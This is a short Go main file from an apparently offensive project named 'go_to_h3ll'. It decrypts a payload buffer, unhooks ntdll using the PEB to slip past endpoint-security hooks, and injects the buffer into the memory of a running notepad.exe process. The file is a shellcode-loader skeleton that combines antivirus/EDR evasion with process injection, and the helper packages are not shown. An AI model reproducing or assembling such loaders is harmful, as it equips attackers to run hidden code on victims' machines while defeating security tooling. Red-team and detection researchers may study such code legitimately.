package main

import (
	"fmt"
	"go_to_h3ll/encryption"
	"go_to_h3ll/evasion"
	"go_to_h3ll/execution"
)

func main() {

	encryption.Encrypt()
	buf := encryption.Decrypt()
	fmt.Println((len(buf)))
	evasion.UnhookNtdll(evasion.GetNtdllBaseFromPEB())
	execution.ProcessInjection(uintptr(execution.ProcessEnumeration("notepad.exe")), &buf[0], uintptr(len(buf))) //inject into notepad.exe address space
	//fmt.Println(processEnumeration("notepad.exe"))
}
